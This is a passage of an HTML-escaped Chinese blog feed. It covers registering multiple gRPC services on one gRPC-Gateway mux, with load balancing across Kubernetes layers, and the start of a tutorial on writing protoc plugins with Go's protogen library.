&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">helloworldpb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">RegisterGreeterHandler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Background&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="nx">gwmux&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">conn&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Fatalln&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Failed to register gateway:&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>gwmux&lt;/code>是 gRPC-Gateway 的运行时 &lt;code>mux&lt;/code> 实例，可以理解成路由。 标准库的 &lt;code>http&lt;/code> 包也有自己的 &lt;code>mux&lt;/code> ，但 gRPC-Gateway 项目自己实现了一个。看到 &lt;code>gwmux&lt;/code>应该就能想到这肯定是注册路由，理论上来说——如果你有多个 gRPC 服务，而且 url 没有冲突的话，注册多个服务到路由上应该是没有问题的。&lt;/p>
&lt;p>所以剩下的问题就是这个 &lt;code>RegisterGreeterHandler&lt;/code> 内是不是我们预期的那样，类似 &lt;code>mux&lt;/code> 注册路由的用法？&lt;/p>
&lt;h3 id="registerxxxhandlerclient-实现">RegisterXXXHandlerClient 实现&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/grpc-gateway-used-as-multiple-grpc-server-gateway/image-20220222154718918.png"
width="1207"
height="132"
srcset="https://nnnewb.github.io/blog/blog/p/grpc-gateway-used-as-multiple-grpc-server-gateway/image-20220222154718918_huae7e9726eb83dcb6808b9604bde89ea7_31321_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/grpc-gateway-used-as-multiple-grpc-server-gateway/image-20220222154718918_huae7e9726eb83dcb6808b9604bde89ea7_31321_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="RegisterXXXHandlerClient实现"
class="gallery-image"
data-flex-grow="914"
data-flex-basis="2194px"
>&lt;/p>
&lt;p>顺着 &lt;code>RegisterXXXHandler&lt;/code>很快就能找到实现，&lt;code>RegisterXXXHandlerClient&lt;/code>。&lt;code>Handle&lt;/code>的用法正如预期的那样，是一个类似 &lt;code>http.ServeMux&lt;/code> 的对象。处理函数里的逻辑很清晰。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/grpc-gateway-used-as-multiple-grpc-server-gateway/image-20220222155630463.png"
width="1167"
height="420"
srcset="https://nnnewb.github.io/blog/blog/p/grpc-gateway-used-as-multiple-grpc-server-gateway/image-20220222155630463_hu5863f8bc3c05d0c34f00482d4fdc41e8_65629_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/grpc-gateway-used-as-multiple-grpc-server-gateway/image-20220222155630463_hu5863f8bc3c05d0c34f00482d4fdc41e8_65629_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="HandleFunc"
class="gallery-image"
data-flex-grow="277"
data-flex-basis="666px"
>&lt;/p>
&lt;p>函数体可以简单划分成两部分：&lt;/p>
&lt;ul>
&lt;li>构造和发送请求
&lt;ul>
&lt;li>根据请求的 &lt;code>Content-Type&lt;/code> 选择 &lt;code>Marshaler&lt;/code> 。&lt;/li>
&lt;li>构造请求上下文，从HTTP请求里提取&lt;code>grpc-metadata&lt;/code>开头的元数据到 &lt;code>context&lt;/code> 里。&lt;/li>
&lt;li>&lt;code>request_XXX_0&lt;/code> 反序列化 HTTP 请求体到 protobuf 生成的结构，并发送请求。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>构造和返回响应
&lt;ul>
&lt;li>从响应元数据里构造上下文&lt;/li>
&lt;li>构造和返回 HTTP 响应&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>整个流程是无状态也和 &lt;code>gwmux&lt;/code> 本身无绑定的。换言之，理论上来说完全可以把所有 gRPC-Gateway 生成的 &lt;code>Register&lt;/code> 函数注册到同一个 &lt;code>gwmux&lt;/code> 上。&lt;/p>
&lt;h3 id="backend和注册">Backend和注册&lt;/h3>
&lt;p>出于清晰化的考虑，Gateway 服务的构造过程我写成了 Builder 模式。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">type&lt;/span> &lt;span class="nx">registerHandlerFn&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">mux&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">runtime&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ServeMux&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">conn&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">grpc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ClientConn&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="kd">type&lt;/span> &lt;span class="nx">GRPCBackend&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">RegisterHandlerFunc&lt;/span> &lt;span class="nx">registerHandlerFn&lt;/span>
&lt;span class="nx">BackendAddr&lt;/span> &lt;span class="kt">string&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">DonviewGRPCGatewayServer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">Serve&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">mux&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">runtime&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewServeMux&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">muxOptions&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">backend&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">backends&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">conn&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">grpc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">DialContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">TODO&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="nx">backend&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">BackendAddr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">dialOptions&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">backend&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">RegisterHandlerFunc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">TODO&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="nx">mux&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">conn&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">var&lt;/span> &lt;span class="nx">handler&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Handler&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">mux&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">wrapperFn&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">httpHandlerWrappers&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">handler&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nf">wrapperFn&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">handler&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ListenAndServe&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Sprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;0.0.0.0:%d&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">port&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nx">handler&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>所有 gRPC 后端被注册到 &lt;code>s.backends&lt;/code> ，在开始服务的时候调用 &lt;code>Serve&lt;/code> 函数，把 gRPC 服务注册到 &lt;code>mux&lt;/code> 里。因为事前确保了服务路由不会重叠，理论上来说注册完就能用。&lt;/p>
&lt;h2 id="负载均衡">负载均衡&lt;/h2>
&lt;p>最初的架构里，一个 gRPC-Gateway 服务对应一个 gRPC 服务，请求进入服务的过程是从云服务提供商的 LB =&amp;gt; kubernetes service (load balancer) =&amp;gt; gateway =&amp;gt; ClusterIP =&amp;gt; gRPC Server 。&lt;/p>
&lt;p>后来改成一个 POD 包含 gateway 和 gRPC 两个 container 后，gateway 访问 gRPC 服务就不在经过 ClusterIP 这一层代理了，路径变成云服务商的 LB =&amp;gt; kubernetes service (load balancer) =&amp;gt; gateway =&amp;gt; gRPC Server 。&lt;/p>
&lt;p>最后是现在的版本，网关统一成一个容器，路径和上述一样。&lt;/p>
&lt;p>三者的区别在于负载均衡的时机。Kubernetes 的 ClusterIP 是同样具备负载均衡能力的，最初架构中负载均衡一共进行了三次，从云服务商的LB到主机端口（kubernetes），kubernetes再次负载均衡，转发到 gateway。gateway再经由 ClusterIP 转发至 gRPC 服务，每一次转发都经历一次负载均衡，分别提供了虚拟主机的扩容能力、gateway服务的扩容能力、gRPC服务的扩容能力。&lt;/p>
&lt;p>第二版修改去掉了 gateway 到 gRPC 服务的负载均衡，变成了直连，延迟表现上理论上来说会有改善，但我没做过基准测试，所以这个“理论上”也只是凭感觉说。但可以明确的是 gateway 会额外占据资源配额，造成浪费，不好说值不值，个人感觉没太大意义。&lt;/p>
&lt;p>第三版，统一了 gateway，还是三次负载均衡。不过Gateway对资源配额的使用效率会更好一点，依然保持了主机、gateway、gRPC 服务的可伸缩性。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/grpc-gateway-used-as-multiple-grpc-server-gateway/image-20220222165344894.png"
width="176"
height="714"
srcset="https://nnnewb.github.io/blog/blog/p/grpc-gateway-used-as-multiple-grpc-server-gateway/image-20220222165344894_huca7a171cf394f94ea2cc15092e42ada3_10452_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/grpc-gateway-used-as-multiple-grpc-server-gateway/image-20220222165344894_huca7a171cf394f94ea2cc15092e42ada3_10452_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="三次LB"
class="gallery-image"
data-flex-grow="24"
data-flex-basis="59px"
>&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>单从理论上来说这样设计应该是 OK 的，但是 gRPC-Gateway 官方对负载均衡没有说法，对能不能注册多个 gRPC 服务到一个 &lt;code>mux&lt;/code> 上也没有官方的文档说明，很难说这帮人能不能保证向后兼容，万一之后的版本不支持注册到一个 &lt;code>mux&lt;/code> 上了，到时候改起来就麻烦了，比较坏的情况就是你得自己写一个 &lt;code>protoc-gen-gateway&lt;/code> 这样的玩意儿来生成一个自己的网关。&lt;/p>
&lt;p>此外还有一个缺陷，gRPC-Gateway 到 gRPC Server 的负载均衡由 Kubernetes ClusterIP 提供，但是 &lt;a class="link" href="https://stackoverflow.com/questions/49888133/kubernetes-service-cluster-ip-how-is-this-internally-load-balanced-across-diffe" target="_blank" rel="noopener"
>ClusterIP 的负载均衡算法是 Round Robin/Random&lt;/a> ，并不支持根据负载或其他维度的测量数据来决定如何均衡负载，未来如果需要根据负载情况分发请求，可能还得在网关到 gRPC 服务之间加个负载均衡组件，再提供一个服务发现/注册中心来帮助调度。&lt;/p></description></item><item><title>protogen代码生成</title><link>https://nnnewb.github.io/blog/p/protogen-code-generation/</link><pubDate>Mon, 21 Feb 2022 16:32:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/protogen-code-generation/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>最大的问题其实是 proto 直接生成的 swagger 不好用，过去的 gRPC 写法只在服务端，客户端没享受到静态类型定义的接口的快乐，而且手工写的文档还有一堆很无语的问题，整个系统维护起来蛋疼无比。&lt;/p>
&lt;p>后来解决办法也简单，代码生成，缺什么生成什么，先后经历了用 &lt;code>go&lt;/code> + proto解析写改成用 &lt;code>typescript&lt;/code> 写，再改回 &lt;code>go&lt;/code> + &lt;code>protogen&lt;/code>，一番折腾下来最后还是用 &lt;code>protogen&lt;/code> 最简单舒服。&lt;/p>
&lt;p>这篇博客主要就是介绍下 &lt;code>protogen&lt;/code> 配上 go 模板能做到的事情。&lt;/p>
&lt;h2 id="protogen介绍">&lt;code>protogen&lt;/code>介绍&lt;/h2>
&lt;p>&lt;code>protogen&lt;/code>的官方文档在&lt;a class="link" href="https://pkg.go.dev/google.golang.org/protobuf/compiler/protogen" target="_blank" rel="noopener"
>这里&lt;/a>，&lt;code>protogen&lt;/code>是google官方&lt;code>protoc-gen-go&lt;/code>插件使用的支持库，代码托管在&lt;a class="link" href="https://github.com/protocolbuffers/protobuf-go" target="_blank" rel="noopener"
>github.com/protocolbuffers/protobuf-go&lt;/a> 。可以通过 &lt;a class="link" href="https://github.com/protocolbuffers/protobuf-go/blob/master/cmd/protoc-gen-go/main.go" target="_blank" rel="noopener"
>&lt;code>protoc-gen-go&lt;/code> 的 &lt;code>main&lt;/code> 包代码&lt;/a> 初窥门径。&lt;/p>
&lt;p>不过在开始前，还得先了解下 &lt;code>protoc&lt;/code> 插件是怎么工作的。从官方文档&lt;a class="link" href="https://developers.google.com/protocol-buffers/docs/reference/other" target="_blank" rel="noopener"
>other languages and plugins&lt;/a>摘录如下。&lt;/p>
&lt;blockquote>
&lt;p>&lt;code>protoc&lt;/code>, the Protocol Buffers Compiler, can be extended to support new languages via plugins. &lt;strong>A plugin is just a program which reads a&lt;/strong> &lt;code>CodeGeneratorRequest&lt;/code> &lt;strong>protocol buffer from standard input and then writes a&lt;/strong> &lt;code>CodeGeneratorResponse&lt;/code> &lt;strong>protocol buffer to standard output.&lt;/strong> These message types are defined in &lt;code>plugin.proto&lt;/code>. We recommend that all third-party code generators be written as plugins, as this allows all generators to provide a consistent interface and share a single parser implementation.&lt;/p>
&lt;/blockquote>
&lt;p>简单地说，&lt;code>protoc&lt;/code>插件从&lt;code>stdin&lt;/code>读取一个&lt;code>protobuf&lt;/code>消息，往&lt;code>stdout&lt;/code>写一个&lt;code>protobuf&lt;/code>消息。把&lt;code>protoc&lt;/code>插件理解成服务器，&lt;code>protoc&lt;/code>发送请求，插件返回响应，交互过程不经过网络，而是标准输入/输出，就这样。&lt;/p>
&lt;p>我也不想解释为什么不从零开始写了。&lt;code>protogen&lt;/code>提供了相当完善的封装，很轻松就可以写出一个完整的 &lt;code>protoc&lt;/code> 插件。&lt;/p>
&lt;h3 id="helloworld">HelloWorld&lt;/h3>
&lt;p>先来个惯例。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kn">package&lt;/span> &lt;span class="nx">main&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="p">(&lt;/span>
&lt;span class="s">&amp;#34;log&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;flags&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;google.golang.org/protobuf/compiler/protogen&amp;#34;&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">SetFlags&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">SetPrefix&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;protoc-gen-hello: &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">flags&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">flag&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">FlagSet&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="nx">protogen&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Options&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">ParamFunc&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">flags&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Set&lt;/span>&lt;span class="p">}.&lt;/span>&lt;span class="nf">Run&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">Gen&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">Gen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">plugin&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">protogen&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Plugin&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Hello world&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>什么也不生成，就只是输出一句 Hello world。&lt;/p>
&lt;h3 id="简单生成">简单生成&lt;/h3>
&lt;p>一个简单的&lt;code>proto&lt;/code>文件。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-protobuf" data-lang="protobuf">&lt;span class="n">syntax&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;proto3&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="k">option&lt;/span> &lt;span class="n">go_package&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;play/proto&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="kd">message&lt;/span> &lt;span class="nc">Hello&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="n">name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="p">}&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="kd">message&lt;/span> &lt;span class="nc">World&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="n">greeting&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="p">}&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="kd">service&lt;/span> &lt;span class="n">greeter&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="k">rpc&lt;/span> &lt;span class="n">SayHello&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Hello&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">World&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="p">}&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>输出文件里所有的结构、服务、RPC方法名称。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kn">package&lt;/span> &lt;span class="nx">main&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="p">(&lt;/span>
&lt;span class="s">&amp;#34;flag&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;log&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;google.golang.org/protobuf/compiler/protogen&amp;#34;&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">SetFlags&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">SetPrefix&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;protoc-gen-hello: &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">flags&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">flag&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">FlagSet&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="nx">protogen&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Options&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">ParamFunc&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">flags&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Set&lt;/span>&lt;span class="p">}.&lt;/span>&lt;span class="nf">Run&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">Gen&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">Gen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">plugin&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">protogen&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Plugin&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">filename&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">plugin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">FileToGenerate&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">file&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">plugin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">FilesByPath&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">filename&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">msg&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Messages&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;message: %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">msg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Desc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">FullName&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">svc&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Services&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;service: %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">svc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Desc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">FullName&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">method&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">svc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Methods&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;method: %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">method&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Desc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">FullName&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看出来使用非常简单，但需要注意的是 &lt;code>message&lt;/code> 是可以嵌套的，&lt;code>message&lt;/code>内还能定义&lt;code>message&lt;/code>和&lt;code>enum&lt;/code>，上面的例子没有处理。&lt;/p>
&lt;p>接下来我们把命令行输出改成输出到文件，让程序有点实际用途。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kn">package&lt;/span> &lt;span class="nx">main&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="p">(&lt;/span>
&lt;span class="s">&amp;#34;flag&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;log&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;path&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;strings&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;google.golang.org/protobuf/compiler/protogen&amp;#34;&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">SetFlags&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
